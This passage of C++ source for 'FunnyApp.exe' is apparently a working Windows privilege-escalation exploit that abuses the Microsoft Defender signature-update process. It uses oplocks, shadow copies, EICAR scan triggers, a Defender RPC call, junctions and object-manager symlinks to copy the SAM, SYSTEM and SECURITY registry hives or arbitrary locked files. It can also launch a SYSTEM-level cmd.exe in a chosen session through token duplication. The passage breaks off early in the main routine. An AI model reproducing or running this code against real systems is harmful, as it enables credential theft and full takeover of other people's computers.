		LogE("[SYSTEM] TOKEN_USER allocation failed");
		return false;
	}
	DWORD retsz = 0;
	bool res = GetTokenInformation(htoken, TokenUser, tokenuser, MAX_SID_SIZE + sizeof(TOKEN_USER), &retsz);
	DWORD tokenerror = res ? ERROR_SUCCESS : GetLastError();
	CloseHandle(htoken);
	if (!res) {
		free(tokenuser);
		LogW("[SYSTEM] GetTokenInformation(TokenUser) failed: %lu", tokenerror);
		return false;
	}
	bool islocalsystem = IsWellKnownSid(tokenuser->User.Sid, WinLocalSystemSid) != FALSE;
	free(tokenuser);
	return islocalsystem;
}

bool LaunchConsoleInSessionId(DWORD sessionid)
{
	LogV("[SYSTEM] LaunchConsoleInSessionId entered: session=%lu, binary=%ws\n",
		sessionid, g_ShellBinary);
	HANDLE htoken = NULL;
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &htoken)) {
		LogE("[SYSTEM] OpenProcessToken failed: %lu", GetLastError());
		return false;
	}
	
	SetPrivilege(htoken, SE_TCB_NAME, TRUE);
	SetPrivilege(htoken, SE_ASSIGNPRIMARYTOKEN_NAME, TRUE);
	SetPrivilege(htoken, SE_IMPERSONATE_NAME, TRUE);
	SetPrivilege(htoken, SE_DEBUG_NAME, TRUE);

	HANDLE hnewtoken = NULL;
	bool res = DuplicateTokenEx(htoken, TOKEN_ALL_ACCESS, NULL, SecurityDelegation, TokenPrimary, &hnewtoken);
	CloseHandle(htoken);
	if (!res) {
		LogE("[SYSTEM] DuplicateTokenEx failed: %lu", GetLastError());
		return false;
	}
	
	res = SetTokenInformation(hnewtoken, TokenSessionId, &sessionid, sizeof(DWORD));
	if (!res)
	{
		LogE("[SYSTEM] SetTokenInformation(TokenSessionId) failed: %lu", GetLastError());
		CloseHandle(hnewtoken);
		return false;
	}

	STARTUPINFO si = { 0 };
	PROCESS_INFORMATION pi = { 0 };
	res = CreateProcessAsUser(hnewtoken, g_ShellBinary, NULL, NULL, NULL, FALSE,
		CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);
	DWORD createerror = res ? ERROR_SUCCESS : GetLastError();

	CloseHandle(hnewtoken);

	if (pi.hProcess)
		CloseHandle(pi.hProcess);
	if (pi.hThread)
		CloseHandle(pi.hThread);
	if (!res) {
		LogE("[SYSTEM] CreateProcessAsUser failed: %lu", createerror);
		SetLastError(createerror);
		return false;
	}
	LogV("[SYSTEM] Console process launched successfully\n");
	return true;

}

struct AppOptions
{
	// Leak targets (max 3, because we only have 3 "known-opened" VDM filenames)
	std::vector<std::wstring> leakTargets;

	// Output handling
	std::wstring outDir;          // if set, write outputs here using source basename (or friendly name for known hives)
	std::wstring outFileSingle;   // if set and leakTargets.size()==1, write exactly to this path

	// Behavior toggles
	bool forceMode = false;       // skip Windows Update API check
	bool spawnCmdShell = false;   // launch cmd.exe after leaking (uses existing password-reset + logon trick)
	bool verbose = true;          // detailed tracing is on by default for lab builds

	// Help
	bool showHelp = false;
};

static bool g_Verbose = true;
static SRWLOCK g_LogLock = SRWLOCK_INIT;
static volatile LONG g_LogSequence = 0;
static const char TRACE_BUILD_ID[] = "BHF-TRACE100-20260910-R2";

static void LogMessage(const char* level, const char* fmt, va_list ap)
{
	SYSTEMTIME now = { 0 };
	GetLocalTime(&now);
	AcquireSRWLockExclusive(&g_LogLock);
	LONG sequence = InterlockedIncrement(&g_LogSequence);
	printf("[%02u:%02u:%02u.%03u] [%s] [SEQ:%06ld] [TID:%lu] ",
		now.wHour, now.wMinute, now.wSecond, now.wMilliseconds, level,
		sequence, GetCurrentThreadId());
	vprintf(fmt, ap);
	size_t len = fmt ? strlen(fmt) : 0;
	if (!len || fmt[len - 1] != '\n')
		printf("\n");
	fflush(stdout);
	ReleaseSRWLockExclusive(&g_LogLock);
}

static void LogV(const char* fmt, ...)
{
	if (!g_Verbose)
		return;
	va_list ap;
	va_start(ap, fmt);
	LogMessage("TRACE", fmt, ap);
	va_end(ap);
}

static void LogE(const char* fmt, ...)
{
	va_list ap;
	va_start(ap, fmt);
	LogMessage("ERROR", fmt, ap);
	va_end(ap);
}

static void LogW(const char* fmt, ...)
{
	va_list ap;
	va_start(ap, fmt);
	LogMessage("WARN", fmt, ap);
	va_end(ap);
}

static LONG WINAPI TraceUnhandledException(EXCEPTION_POINTERS* info)
{
	DWORD code = (info && info->ExceptionRecord) ?
		info->ExceptionRecord->ExceptionCode : ERROR_UNHANDLED_EXCEPTION;
	void* address = (info && info->ExceptionRecord) ?
		info->ExceptionRecord->ExceptionAddress : NULL;
	LogE("[CRASH] Unhandled exception: code=0x%08lX, address=%p, tid=%lu",
		(unsigned long)code, address, GetCurrentThreadId());
	return EXCEPTION_CONTINUE_SEARCH;
}

static const char* const TRACE_COVERAGE_MAP[] = {
	"logger initialization and unbuffered output",
	"build fingerprint and compile timestamp",
	"process identifier and initial thread identifier",
	"raw command-line argument count",
	"executable absolute path resolution",
	"current working directory resolution",
	"temporary directory resolution",
	"Windows directory resolution",
	"System32 directory resolution",
	"computer-name query",
	"user-name query",
	"native processor architecture query",
	"logical processor-count query",
	"memory-load query",
	"available physical-memory query",
	"current-volume free-space query",
	"local-system token identity check",
	"required ntdll module handle",
	"NtCreateSymbolicLinkObject export",
	"NtOpenDirectoryObject export",
	"NtQueryDirectoryObject export",
	"NtSetInformationFile export",
	"argument parser entry",
	"force-mode selection",
	"verbose-mode selection",
	"leak-target count",
	"output-file mode",
	"output-directory mode",
	"optional shell mode",
	"Windows Update advisory entry",
	"COM initialization",
	"Windows Update session creation",
	"Windows Update searcher creation",
	"Windows Update search dispatch",
	"Windows Update search completion",
	"available-update collection",
	"update-title enumeration",
	"Defender category classification",
	"signature-versus-platform classification",
	"advisory decision",
	"update-cache path construction",
	"update-cache existence",
	"update-cache open",
	"update-cache size",
	"update-cache allocation",
	"update-cache read completion",
	"Microsoft CDN session creation",
	"Microsoft CDN redirect resolution",
	"HTTP content-length query",
	"download-buffer allocation",
	"download progress",
	"download completion",
	"update PE header validation",
	"embedded resource-directory search",
	"embedded cabinet discovery",
	"FDI context creation",
	"cabinet-copy operation",
	"cabinet member enumeration",
	"update-file linked-list construction",
	"update-package readiness",
	"VSS release-event creation",
	"VSS trigger path construction",
	"shadow-copy finder-thread creation",
	"EICAR work-directory creation",
	"EICAR trigger-file creation",
	"EICAR trigger-content write",
	"Restart Manager DLL exclusive open",
	"Restart Manager batch-oplock request",
	"Defender scan trigger open",
	"Restart Manager oplock break",
	"existing shadow-copy enumeration",
	"new shadow-copy object detection",
	"new shadow-copy accessibility check",
	"FreezeVSS worker creation",
	"Cloud Files sync-root path",
	"cloud lock-file creation",
	"Cloud Files sync-root registration",
	"Cloud Files sync-root connection",
	"WinDefend service PID query",
	"placeholder callback process identity",
	"Defender placeholder callback match",
	"cloud batch-oplock request",
	"cloud oplock break",
	"snapshot-ready event",
	"update staging-directory creation",
	"VDM member staging",
	"Definition Updates directory open",
	"directory-notification event creation",
	"directory-notification arming",
	"Defender RPC worker creation",
	"RPC string-binding composition",
	"RPC binding-handle creation",
	"Proc42 dispatch",
	"Proc42 return and server status",
	"definition-directory notification",
	"notification-record parsing",
	"staged mpasbase NT-path construction",
	"staged-file batch-oplock request",
	"staged-file oplock break",
	"oplocked-file rename",
	"staging-directory move",
	"reparse-directory recreation",
	"mount-point reparse creation",
	"object-manager symlink creation",
	"Defender output-file wait",
	"Defender output-file open",
	"Defender output-file size",
	"Defender output-file lock and read",
	"destination output-file creation",
	"destination output-file write",
	"freeze-worker release",
	"RPC worker shutdown",
	"resource cleanup",
	"final exit summary",
};
static_assert(sizeof(TRACE_COVERAGE_MAP) / sizeof(TRACE_COVERAGE_MAP[0]) >= 100,
	"The trace coverage map must contain at least 100 output lines");

static void EmitTraceCoverageMap()
{
	const DWORD count = (DWORD)(sizeof(TRACE_COVERAGE_MAP) / sizeof(TRACE_COVERAGE_MAP[0]));
	LogW("[TRACE100] Runtime trace map begins: build=%s, checkpoints=%lu",
		TRACE_BUILD_ID, count);
	LogW("[TRACE100] Default startup emits at least %lu trace lines before live stage work",
		count + 20);
	for (DWORD i = 0; i < count; i++)
		LogV("[TRACE-MAP %03lu/%03lu] armed: %s\n",
			i + 1, count, TRACE_COVERAGE_MAP[i]);
	LogW("[TRACE100] Runtime trace map complete; live execution follows");
}

static void EmitRuntimeDiagnostics()
{
	wchar_t modulepath[MAX_PATH] = { 0 };
	wchar_t currentdir[MAX_PATH] = { 0 };
	wchar_t temppath[MAX_PATH] = { 0 };
	wchar_t windowsdir[MAX_PATH] = { 0 };
	wchar_t systemdir[MAX_PATH] = { 0 };
	wchar_t computer[MAX_COMPUTERNAME_LENGTH + 1] = { 0 };
	wchar_t username[UNLEN + 1] = { 0 };
	DWORD computerchars = MAX_COMPUTERNAME_LENGTH + 1;
	DWORD userchars = UNLEN + 1;
	SYSTEM_INFO systeminfo = { 0 };
	MEMORYSTATUSEX memory = { 0 };
	memory.dwLength = sizeof(memory);
	ULARGE_INTEGER freebytes = { 0 };
	ULARGE_INTEGER totalbytes = { 0 };
	ULARGE_INTEGER totalfree = { 0 };

	DWORD modulechars = GetModuleFileNameW(NULL, modulepath, MAX_PATH);
	DWORD currentchars = GetCurrentDirectoryW(MAX_PATH, currentdir);
	DWORD tempchars = GetTempPathW(MAX_PATH, temppath);
	UINT windowschars = GetWindowsDirectoryW(windowsdir, MAX_PATH);
	UINT systemchars = GetSystemDirectoryW(systemdir, MAX_PATH);
	BOOL computerok = GetComputerNameW(computer, &computerchars);
	BOOL userok = GetUserNameW(username, &userchars);
	GetNativeSystemInfo(&systeminfo);
	BOOL memoryok = GlobalMemoryStatusEx(&memory);
	BOOL diskok = currentchars && currentchars < MAX_PATH &&
		GetDiskFreeSpaceExW(currentdir, &freebytes, &totalbytes, &totalfree);

	LogV("[RUNTIME] build_id=%s\n", TRACE_BUILD_ID);
	LogV("[RUNTIME] compiler_timestamp=%s %s\n", __DATE__, __TIME__);
	LogV("[RUNTIME] process_id=%lu thread_id=%lu\n",
		GetCurrentProcessId(), GetCurrentThreadId());
	LogV("[RUNTIME] module_path_ok=%s chars=%lu path=%ws\n",
		(modulechars && modulechars < MAX_PATH) ? "yes" : "no", modulechars,
		modulechars ? modulepath : L"(unavailable)");
	LogV("[RUNTIME] current_directory_ok=%s chars=%lu path=%ws\n",
		(currentchars && currentchars < MAX_PATH) ? "yes" : "no", currentchars,
		currentchars ? currentdir : L"(unavailable)");
	LogV("[RUNTIME] temp_path_ok=%s chars=%lu path=%ws\n",
		(tempchars && tempchars < MAX_PATH) ? "yes" : "no", tempchars,
		tempchars ? temppath : L"(unavailable)");
	LogV("[RUNTIME] windows_directory_ok=%s chars=%u path=%ws\n",
		(windowschars && windowschars < MAX_PATH) ? "yes" : "no", windowschars,
		windowschars ? windowsdir : L"(unavailable)");
	LogV("[RUNTIME] system_directory_ok=%s chars=%u path=%ws\n",
		(systemchars && systemchars < MAX_PATH) ? "yes" : "no", systemchars,
		systemchars ? systemdir : L"(unavailable)");
	LogV("[RUNTIME] computer_name_ok=%s value=%ws\n",
		computerok ? "yes" : "no", computerok ? computer : L"(unavailable)");
	LogV("[RUNTIME] user_name_ok=%s value=%ws\n",
		userok ? "yes" : "no", userok ? username : L"(unavailable)");
	LogV("[RUNTIME] processor_architecture=%u processors=%lu page_size=%lu\n",
		systeminfo.wProcessorArchitecture, systeminfo.dwNumberOfProcessors,
		systeminfo.dwPageSize);
	ULARGE_INTEGER availablephysical = { 0 };
	availablephysical.QuadPart = memory.ullAvailPhys;
	LogV("[RUNTIME] memory_query_ok=%s load=%lu%% available_physical=0x%08lX%08lX\n",
		memoryok ? "yes" : "no", memory.dwMemoryLoad,
		availablephysical.HighPart, availablephysical.LowPart);
	LogV("[RUNTIME] disk_query_ok=%s free_to_caller=0x%08lX%08lX total=0x%08lX%08lX total_free=0x%08lX%08lX\n",
		diskok ? "yes" : "no", freebytes.HighPart, freebytes.LowPart,
		totalbytes.HighPart, totalbytes.LowPart, totalfree.HighPart, totalfree.LowPart);
	LogV("[RUNTIME] ntdll=%p NtCreateSymbolicLinkObject=%p\n",
		hm, _NtCreateSymbolicLinkObject);
	LogV("[RUNTIME] NtOpenDirectoryObject=%p NtQueryDirectoryObject=%p NtSetInformationFile=%p\n",
		_NtOpenDirectoryObject, _NtQueryDirectoryObject, _NtSetInformationFile);
}

static DWORD WaitOneWithHeartbeat(HANDLE handle, DWORD timeoutms, const char* label)
{
	DWORD started = GetTickCount();
	DWORD heartbeat = 0;
	for (;;)
	{
		DWORD elapsed = GetTickCount() - started;
		if (elapsed >= timeoutms)
		{
			LogW("[WAIT:%s] timeout reached: elapsed=%lu ms, handle=%p",
				label, elapsed, handle);
			return WAIT_TIMEOUT;
		}
		DWORD remaining = timeoutms - elapsed;
		DWORD slice = remaining < TRACE_HEARTBEAT_MS ? remaining : TRACE_HEARTBEAT_MS;
		DWORD result = WaitForSingleObject(handle, slice);
		if (result == WAIT_TIMEOUT)
		{
			heartbeat++;
			LogV("[WAIT:%s] heartbeat=%lu elapsed=%lu/%lu ms handle=%p\n",
				label, heartbeat, GetTickCount() - started, timeoutms, handle);
			continue;
		}
		DWORD waiterror = result == WAIT_FAILED ? GetLastError() : ERROR_SUCCESS;
		LogV("[WAIT:%s] completed: result=0x%08lX elapsed=%lu ms error=%lu\n",
			label, (unsigned long)result, GetTickCount() - started, waiterror);
		if (result == WAIT_FAILED)
			SetLastError(waiterror);
		return result;
	}
}

static DWORD WaitManyWithHeartbeat(DWORD count, const HANDLE* handles,
	BOOL waitall, DWORD timeoutms, const char* label)
{
	DWORD started = GetTickCount();
	DWORD heartbeat = 0;
	for (;;)
	{
		DWORD elapsed = GetTickCount() - started;
		if (elapsed >= timeoutms)
		{
			LogW("[WAIT:%s] timeout reached: elapsed=%lu ms, handles=%lu",
				label, elapsed, count);
			return WAIT_TIMEOUT;
		}
		DWORD remaining = timeoutms - elapsed;
		DWORD slice = remaining < TRACE_HEARTBEAT_MS ? remaining : TRACE_HEARTBEAT_MS;
		DWORD result = WaitForMultipleObjects(count, handles, waitall, slice);
		if (result == WAIT_TIMEOUT)
		{
			heartbeat++;
			LogV("[WAIT:%s] heartbeat=%lu elapsed=%lu/%lu ms handles=%lu\n",
				label, heartbeat, GetTickCount() - started, timeoutms, count);
			continue;
		}
		DWORD waiterror = result == WAIT_FAILED ? GetLastError() : ERROR_SUCCESS;
		LogV("[WAIT:%s] completed: result=0x%08lX elapsed=%lu ms error=%lu\n",
			label, (unsigned long)result, GetTickCount() - started, waiterror);
		if (result == WAIT_FAILED)
			SetLastError(waiterror);
		return result;
	}
}


static void CancelPendingIoWithTrace(HANDLE file, OVERLAPPED* operation,
	const char* label)
{
	if (!file || file == INVALID_HANDLE_VALUE || !operation || !operation->hEvent)
		return;
	if (!CancelIo(file) && GetLastError() != ERROR_NOT_FOUND)
		LogW("[%s] CancelIo failed: error=%lu", label, GetLastError());
	DWORD waitresult = WaitOneWithHeartbeat(operation->hEvent, 5000,
		"cancel-pending-io");
	if (waitresult == WAIT_OBJECT_0)
	{
		DWORD ignored = 0;
		if (!GetOverlappedResult(file, operation, &ignored, FALSE) &&
			GetLastError() != ERROR_OPERATION_ABORTED)
			LogW("[%s] Cancel completion returned error=%lu", label, GetLastError());
	}
	else
	{
		LogW("[%s] Cancel completion wait returned 0x%08lX",
			label, (unsigned long)waitresult);
	}
}

static bool StartsWithI(const wchar_t* s, const wchar_t* prefix)
{
	if (!s || !prefix) return false;
	size_t n = wcslen(prefix);
	return _wcsnicmp(s, prefix, n) == 0;
}

static std::wstring BasenameOfPath(const std::wstring& p)
{
	if (p.empty()) return L"";
	const wchar_t* base = PathFindFileNameW(p.c_str());
	return base ? std::wstring(base) : p;
}

static std::wstring FriendlyNameForKnownHive(const std::wstring& target)
{
	// Normalize by checking suffix, so both "C:\Windows\...\SAM" and "\Windows\...\SAM" map.
	if (target.size() >= 3)
	{
		if (_wcsicmp(target.c_str() + (target.size() - 3), L"SAM") == 0) return L"SAM";
	}
	if (target.size() >= 6)
	{
		if (_wcsicmp(target.c_str() + (target.size() - 6), L"SYSTEM") == 0) return L"SYSTEM";
	}
	if (target.size() >= 8)
	{
		if (_wcsicmp(target.c_str() + (target.size() - 8), L"SECURITY") == 0) return L"SECURITY";
	}
	return L"";
}

static void PrintUsage()
{
	printf(
		"Usage:\n"
		"  FunnyApp.exe [options]\n\n"
		"Leak selection (max 3 targets per run):\n"
		"  --dump sam|system|security|all      Leak one or all registry hives (default: all)\n"
		"  --leak <path>                       Leak an arbitrary file (can be repeated, max 3)\n\n"
		"Output:\n"
		"  --out <path>                        Output path (only when leaking exactly 1 target)\n"
		"  --out-dir <dir>                     Output directory (writes <name>.bin by default)\n\n"
		"Actions:\n"
		"  --cmd                               Spawn an interactive cmd.exe after leaking (requires SAM)\n\n"
		"Other:\n"
		"  --force                             Skip the advisory Windows Update API check\n"
		"  --verbose                           Enable detailed trace output (default)\n"
		"  --quiet                             Suppress trace map, progress, and heartbeat lines\n"
		"  --help                              Show this help\n"
	);
}

static bool ParseArgs(int argc, wchar_t* argv[], AppOptions& opt)
{
	// Defaults
	opt.leakTargets.clear();

	auto addTarget = [&](const std::wstring& t) -> bool {
		if (t.empty()) {
			LogE("[ARGS] Empty leak target was supplied");
			return false;
		}
		if (opt.leakTargets.size() >= 3) {
			LogE("[ARGS] More than three leak targets were supplied");
			return false;
		}
		opt.leakTargets.push_back(t);
		return true;
	};

	for (int i = 1; i < argc; i++)
	{
		if (_wcsicmp(argv[i], L"--help") == 0 || _wcsicmp(argv[i], L"-h") == 0 || _wcsicmp(argv[i], L"/?") == 0)
		{
			opt.showHelp = true;
			return true;
		}
		if (_wcsicmp(argv[i], L"--force") == 0)
		{
			opt.forceMode = true;
			continue;
		}
		if (_wcsicmp(argv[i], L"--cmd") == 0)
		{
			opt.spawnCmdShell = true;
			continue;
		}
		if (_wcsicmp(argv[i], L"--verbose") == 0 || _wcsicmp(argv[i], L"-v") == 0)
		{
			opt.verbose = true;
			continue;
		}
		if (_wcsicmp(argv[i], L"--quiet") == 0)
		{
			opt.verbose = false;
			continue;
		}
		if (_wcsicmp(argv[i], L"--dump") == 0)
		{
			if (i + 1 >= argc) {
				LogE("[ARGS] --dump requires a value");
				return false;
			}
			const wchar_t* which = argv[++i];
			if (_wcsicmp(which, L"all") == 0)
			{
				addTarget(L"\\Windows\\System32\\Config\\SAM");
				addTarget(L"\\Windows\\System32\\Config\\SYSTEM");
				addTarget(L"\\Windows\\System32\\Config\\SECURITY");
			}
			else if (_wcsicmp(which, L"sam") == 0)
			{
				addTarget(L"\\Windows\\System32\\Config\\SAM");
			}
			else if (_wcsicmp(which, L"system") == 0)
			{
				addTarget(L"\\Windows\\System32\\Config\\SYSTEM");
			}
			else if (_wcsicmp(which, L"security") == 0)
			{
				addTarget(L"\\Windows\\System32\\Config\\SECURITY");
			}
			else
			{
				LogE("[ARGS] Unsupported --dump value: %ws", which);
				return false;
			}
			continue;
		}
		if (_wcsicmp(argv[i], L"--leak") == 0)
		{
			if (i + 1 >= argc) {
				LogE("[ARGS] --leak requires a path");
				return false;
			}
			if (!addTarget(argv[++i])) return false;
			continue;
		}
		if (_wcsicmp(argv[i], L"--out") == 0)
		{
			if (i + 1 >= argc) {
				LogE("[ARGS] --out requires a path");
				return false;
			}
			opt.outFileSingle = argv[++i];
			continue;
		}
		if (_wcsicmp(argv[i], L"--out-dir") == 0)
		{
			if (i + 1 >= argc) {
				LogE("[ARGS] --out-dir requires a directory");
				return false;
			}
			opt.outDir = argv[++i];
			continue;
		}
		LogE("[ARGS] Unknown argument: %ws", argv[i]);
		return false;
	}

	// If no explicit leak selection was made, default to all three hives.
	if (opt.leakTargets.empty())
	{
		addTarget(L"\\Windows\\System32\\Config\\SAM");
		addTarget(L"\\Windows\\System32\\Config\\SYSTEM");
		addTarget(L"\\Windows\\System32\\Config\\SECURITY");
	}

	// Validate output args
	if (!opt.outFileSingle.empty() && opt.leakTargets.size() != 1)
	{
		LogE("[ARGS] --out is valid only with exactly one target");
		return false;
	}

	return true;
}

int wmain(int argc, wchar_t* argv[])
{
	setvbuf(stdout, NULL, _IONBF, 0);
	setvbuf(stderr, NULL, _IONBF, 0);
	SetUnhandledExceptionFilter(TraceUnhandledException);
	LogW("[BUILD-MARKER] %s; compiled=%s %s; source=FunnyApp.cpp",
		TRACE_BUILD_ID, __DATE__, __TIME__);
	LogV("[START] FunnyApp process started; argc=%d, pid=%lu\n", argc, GetCurrentProcessId());

	// Parse --shell flag early (needed by both SYSTEM service path and normal path)
	bool earlyquiet = false;
	for (int i = 1; i < argc; i++)
	{
		if (_wcsicmp(argv[i], L"--shell") == 0)
		{
			g_ShellBinary = L"C:\\Windows\\System32\\cmd.exe";
		}
		if (_wcsicmp(argv[i], L"--quiet") == 0)
			earlyquiet = true;
	}
	if (!earlyquiet)
	{
		EmitRuntimeDiagnostics();
		EmitTraceCoverageMap();
	}
	else
	{
		LogW("[TRACE100] --quiet detected; startup trace map and heartbeat output are suppressed");
		g_Verbose = false;
	}

	if (IsRunningAsLocalSystem())
	{
		LogV("[SYSTEM] Process is running as LocalSystem; entering service/session helper path\n");
		DWORD sessionid = 0;
		for (int i = 1; i < argc; i++)
		{
			// Session ID is a numeric argument
			DWORD val = _wtoi(argv[i]);
			if (val > 0) {
				sessionid = val;
				break;
			}
		}
		bool helperresult = false;
		if (sessionid) {
			LogV("[SYSTEM] Launching %ws in session %lu\n", g_ShellBinary, sessionid);
			helperresult = LaunchConsoleInSessionId(sessionid);
		}
		else
		{
			LogE("[SYSTEM] No valid target session ID was supplied");
		}
		LogV("[EXIT] LocalSystem helper path completed: result=%s\n",
			helperresult ? "success" : "failure");
		return helperresult ? 0 : 1;
	}
	

	AppOptions opt;
	if (!ParseArgs(argc, argv, opt))
	{
		LogE("[EXIT] Command-line parsing failed");
		PrintUsage();
		return 2;
	}
	if (opt.showHelp)
	{
		LogV("[EXIT] Help requested\n");
		PrintUsage();
		return 0;
	}
	g_Verbose = opt.verbose;
	#if defined(__MINGW32__)
	LogW("[BUILD] MinGW-w64 build detected; native RpcTryExcept SEH is unavailable");
	#elif defined(_MSC_VER)
	LogV("[BUILD] MSVC-compatible build detected; RPC exception tracing is enabled\n");
	#endif
	LogV("[ARGS] force=%s, targets=%lu, shell=%s, output_file=%s, output_dir=%s\n",
		opt.forceMode ? "yes" : "no", (unsigned long)opt.leakTargets.size(),
		opt.spawnCmdShell ? "yes" : "no",
		opt.outFileSingle.empty() ? "default" : "set",
		opt.outDir.empty() ? "default" : "set");
	for (size_t i = 0; i < opt.leakTargets.size(); i++)
		LogV("[ARGS] target[%lu]=%ws\n", (unsigned long)i, opt.leakTargets[i].c_str());

	// Each target is leaked via a different VDM filename in the same junction-redirected directory.
	// Defender opens these files during the update pass; we repoint them at our desired targets.
	const wchar_t* vdmfiles[] = { L"mpasbase.vdm", L"mpavbase.vdm", L"mpasdlta.vdm" };
	const int leakCount = (int)opt.leakTargets.size();
	wchar_t fullvsspath[MAX_PATH] = { 0 };
	HANDLE hreleaseready = NULL;
	wchar_t updtitle[0x200] = { 0 };
	wchar_t targetfile[MAX_PATH] = { 0 };
	wchar_t copiedfilepath[MAX_PATH] = { 0 };
	/*
	if (argc >= 2) {
		wcscpy(targetfile, argv[1]);
		//printf("Target file : \"%ws\"\n", targetfile);
	}
	else {
		
		wcscpy(targetfile, L"C:\\Windows\\System32\\Config\\ELAM");
		//printf("No source file specified, \"%ws\" will be used.\n", targetfile);
	}
	if (argc > 2) {
		wcscpy(copiedfilepath, argv[2]);
		//printf("Copy file path : \"%ws\"\n", copiedfilepath);
	}
	else
	{

		//printf("No file path was specified for file copy, \"%ws\" will be used.\n", copiedfilepath);
	}

	HANDLE hcheck = CreateFile(copiedfilepath, GENERIC_WRITE | DELETE, NULL, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL | FILE_DELETE_ON_CLOSE, NULL);
	if (!hcheck || hcheck == INVALID_HANDLE_VALUE)
	{
		//printf("Cannot open file to copy leaked file to, please specify a different path");
		return 0;
	}
	CloseHandle(hcheck);
	hcheck = CreateFile(targetfile, FILE_READ_DATA, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hcheck && hcheck != INVALID_HANDLE_VALUE)
	{
		//printf("Target file can be opened for read access, exiting.");
		CloseHandle(hcheck);
		return 0;
	}
	DWORD lasterr = GetLastError();
	if(lasterr == ERROR_FILE_NOT_FOUND || lasterr == ERROR_PATH_NOT_FOUND)
	{
		//printf("Target file does not exist.\n");
		return 0;
	}
	*/
	wchar_t nttargetfile[MAX_PATH] = { 0 };
	//wcscpy(nttargetfile, L"\\??\\");
	//wcscat(nttargetfile, targetfile);

	wchar_t* filestodel[100] = { 0 };
	HINTERNET hint = NULL;
	HINTERNET hint2 = NULL;
	char data[0x1000] = { 0 };
	DWORD index = 0;
	DWORD sz = sizeof(data);
	bool res2 = 0;
	wchar_t filesz[50] = { 0 };
	LARGE_INTEGER li = { 0 };
	GUID uid = { 0 };
	RPC_WSTR wuid = { 0 };
	wchar_t* wuid2 = 0;
	wchar_t envstr[MAX_PATH] = { 0 };
	wchar_t mpampath[MAX_PATH] = { 0 };
	HANDLE hmpap = NULL;
	void* exebuff = NULL;
	DWORD readsz = 0;
	HANDLE hmapping = NULL;
	void* mappedbuff = NULL;
	HRSRC hres = NULL;
	DWORD ressz = NULL;
	HGLOBAL cabbuff = NULL;
	wchar_t cabpath[MAX_PATH] = { 0 };
	wchar_t updatepath[MAX_PATH] = { 0 };
	HANDLE hcab = NULL;
	ERF erfstruct = { 0 };
	HFDI hcabctx = NULL;
	char _updatepath[MAX_PATH] = { 0 };
	bool extractres = false;
	char buff[0x1000] = { 0 };
	DWORD retbytes = 0;
	DWORD tid = 0;
	HANDLE hthread = NULL;
	WDRPCWorkerThreadArgs threadargs = { 0 };
	HANDLE hdir = NULL;
	wchar_t newdefupdatedirname[MAX_PATH] = { 0 };
	wchar_t updatelibpath[MAX_PATH] = { 0 };
	UNICODE_STRING unistrupdatelibpath = { 0 };
	OBJECT_ATTRIBUTES objattr = { 0 };
	IO_STATUS_BLOCK iostat = { 0 };
	HANDLE hupdatefile = NULL;
	NTSTATUS ntstat = 0;
	OVERLAPPED ovd = { 0 };
	DWORD transfersz = 0;
	wchar_t newname[MAX_PATH] = { 0 };
	DWORD renstructsz = 0;
	UNICODE_STRING objlinkname = { 0 };
	UNICODE_STRING objlinktarget = { 0 };
	FILE_RENAME_INFO* fri = 0;
	wchar_t wreparsedirpath[MAX_PATH] = { 0 };
	UNICODE_STRING reparsedirpath = { 0 };
	HANDLE hreparsedir = NULL;
	wchar_t newtmp[MAX_PATH] = { 0 };
	wchar_t rptarget[MAX_PATH] = { 0 };
	wchar_t printname[1] = { L'\0' };
	size_t targetsz = 0;
	size_t printnamesz = 0;
	size_t pathbuffersz = 0;
	size_t totalsz = 0;
	REPARSE_DATA_BUFFER* rdb = 0;
	DWORD cb = 0;
	OVERLAPPED ov = { 0 };
	bool ret = false;
	DWORD retsz = 0;
	HANDLE hleakedfile = NULL;
	HANDLE hobjlink = NULL;
	HANDLE hobjlinks[3] = { NULL, NULL, NULL };
	wchar_t sampath[MAX_PATH] = { 0 };
	LARGE_INTEGER _filesz = { 0 };
	OVERLAPPED ovd2 = { 0 };
	DWORD __readsz = 0;
	void* leakedfilebuff = 0;
	bool filelocked = false;
	bool needcabcleanup = false;
	bool dirmoved = false;
	bool needupdatedircleanup = false;
	UpdateFiles* UpdateFilesList = NULL;
	UpdateFiles* UpdateFilesListCurrent = NULL;
	bool isvssready = false;
	bool criterr = false;
	bool sawSam = false;
	int processresult = 1;
	int updatefilecount = 0;
	const char* flowstage = "initialization";
	const char* exitreason = "flow did not reach completion";
	unsigned long exitdetail = 0;
	int exitline = 0;
	int flowstageindex = 0;

#define FLOW_STAGE(name) \
	do { \
		flowstage = (name); flowstageindex++; \
		LogV("[LIVE-STAGE %02d] enter=%s\n", flowstageindex, flowstage); \
	} while (0)
#define FLOW_FAIL(stage, reason, code) \
	do { \
		flowstage = (stage); exitreason = (reason); \
		exitdetail = (unsigned long)(code); exitline = __LINE__; \
		LogE("[EXIT] stage_index=%d, stage=%s, reason=%s, code=0x%08lX, source_line=%d", \
			flowstageindex, flowstage, exitreason, exitdetail, exitline); \
		goto cleanup; \
	} while (0)
#define FLOW_FAIL_WIN32(stage, reason) \
	do { DWORD _flow_error = GetLastError(); FLOW_FAIL((stage), (reason), _flow_error); } while (0)

	if (!hm || !_NtCreateSymbolicLinkObject || !_NtOpenDirectoryObject ||
		!_NtQueryDirectoryObject || !_NtSetInformationFile)
	{
		FLOW_FAIL("initialization", "Required ntdll export is unavailable", ERROR_PROC_NOT_FOUND);
	}
	LogV("[INIT] Required ntdll exports resolved\n");

	try {
		FLOW_STAGE("update-precheck");
		if (opt.forceMode)
		{
			LogV("[WUA] --force supplied; skipping the advisory Windows Update API check\n");
		}
		else
		{
			LogV("[WUA] Performing one advisory check for a pending KB2267602 update\n");
			bool pendingupdate = CheckForWDUpdatesWithProgress(updtitle,
				sizeof(updtitle) / sizeof(updtitle[0]), &criterr);
			if (pendingupdate)
				LogV("[WUA] Pending signature update=%ws\n", updtitle);
			else if (criterr)
				LogW("[WUA] Check failed; continuing with the local cache/CDN fallback");
			else
				LogW("[WUA] No pending signature update was reported; continuing anyway. The RPC may reject an already-applied package");
		}

		FLOW_STAGE("update-package-load");
		UpdateFilesList = GetUpdateFiles(&updatefilecount);
		if (!UpdateFilesList)
		{
